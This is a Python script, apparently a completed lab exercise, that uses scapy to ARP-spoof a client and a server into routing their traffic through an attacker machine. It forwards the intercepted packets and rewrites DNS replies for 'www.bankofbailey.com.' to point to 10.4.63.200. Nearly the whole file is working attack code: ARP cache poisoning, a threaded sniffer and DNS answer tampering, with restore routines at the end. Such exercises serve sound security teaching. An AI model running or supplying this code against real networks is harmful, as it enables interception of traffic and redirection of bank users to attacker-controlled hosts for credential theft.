# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    # Sends an ARP request to the IP address and returns a list of tuples containing the sent and received packets.
    reply = arping(IP, timeout = 5)

    # Extract the mac address (hwsrc -> source hardware request).
    # arping returns 2 lists. A list of answer packets and unanswered packets (so a tuple of two lists). Each element
    # in this list is a tuple of 2 elements (sent packet, recieved packet). 
    # So reply[0][0][1] returns the ARP reply packet of the first device that replied. 
    mac = reply[0][0][1].getlayer(ARP).hwsrc
    # debug(IP + " => " + mac)
    return mac


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    # debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    send(ARP(hwsrc = srcMAC, psrc = srcIP, hwdst = dstMAC, pdst = dstIP, op = 2))


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    # debug(f"restoring ARP table for {dstIP}")
    send(ARP(hwsrc = srcMAC, psrc = srcIP, hwdst = dstMAC, pdst = dstIP, op = 2))


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC

    # get the ethernet and IP layers
    eth = None
    ip = None

    if Ether in packet:
        eth = packet[Ether]
    
    if IP in packet:
        ip = packet[IP]
    

    # Don't do anything for attacker's own packets
    if eth and eth.src == attackerMAC:
        return
    
    # Forward spooked traffic (either forward to DNS server or client but modified)
    if IP in packet:
        if ip.dst == serverIP:
            eth.src = attackerMAC
            eth.dst = serverMAC
            sendp(packet)
        elif ip.dst == clientIP:
            eth.src = attackerMAC
            eth.dst = clientMAC
            
            # spoof and change for www.bankofbailey.com.
            if DNS in packet and packet[DNS].qd.qname.decode() == "www.bankofbailey.com." and packet[DNS].ancount:
                # remove length and checksum, as scapy adds this automatically.
                del ip.len
                del ip.chksum
                del packet[UDP].len
                del packet[UDP].chksum
                packet[DNS].an.rdata = "10.4.63.200"

            # send normally
            sendp(packet)


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
